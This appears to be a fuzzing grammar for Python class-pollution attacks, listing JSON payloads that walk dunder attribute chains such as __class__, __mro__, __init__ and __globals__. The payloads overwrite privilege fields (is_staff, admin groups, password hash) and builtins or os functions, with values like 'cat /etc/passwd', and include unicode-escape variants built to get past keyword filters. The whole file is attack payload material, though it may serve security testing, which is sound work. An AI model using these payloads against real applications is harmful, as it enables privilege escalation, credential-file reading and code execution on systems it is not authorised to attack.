<class_target> = "secret_key":"pwned"
<class_target> = "permissions":["admin","write","delete"]
<class_target> = "level":9999
<class_target> = "_password_hash":"$2b$12$evil"
<class_target> = "email_verified":true
<class_target> = "is_staff":true
<class_target> = "groups":["admin","superadmin"]

<bases_chain> = {"__class__":{"__bases__":{"0":{<class_target>}}}}
<bases_chain> = {"__class__":{"__mro__":{"1":{<class_target>}}}}

<dict_chain> = {"__dict__":{<class_target>}}
<dict_chain> = {"__class__":{"__dict__":{<class_target>}}}

<shallow_dunder> = {"__class__":"replaced"}
<shallow_dunder> = {"__init__":null}
<shallow_dunder> = {"__reduce__":null}
<shallow_dunder> = {"__setattr__":null}

<nested_chain> = {"__class__":{"__init__":{"__globals__":{"__builtins__":{"__import__":"REPLACED"}}}}}
<nested_chain> = {"__class__":{"__bases__":{"0":{"__init__":{"__globals__":{<globals_target>}}}}}}
<nested_chain> = {"__class__":{"__init__":{"__globals__":{"os":{"system":"id","popen":"cat /etc/passwd"}}}}}
<nested_chain> = {"__class__":{"__subclasses__":{"0":{"__init__":{"__globals__":{<globals_target>}}}}}}
<nested_chain> = {"__class__":{"__mro__":{"2":{"__init__":{"__globals__":{<globals_target>}}}}}}

<payload> = <filter_bypass>
<filter_bypass> = {"\u005f\u005fclass\u005f\u005f":{<class_target>}}
<filter_bypass> = {"\u005f\u005fclass\u005f\u005f":{"\u005f\u005finit\u005f\u005f":{"\u005f\u005fglobals\u005f\u005f":{<globals_target>}}}}
<filter_bypass> = {"__class__":{"__init\u005f\u005f":{"__globals__":{<globals_target>}}}}

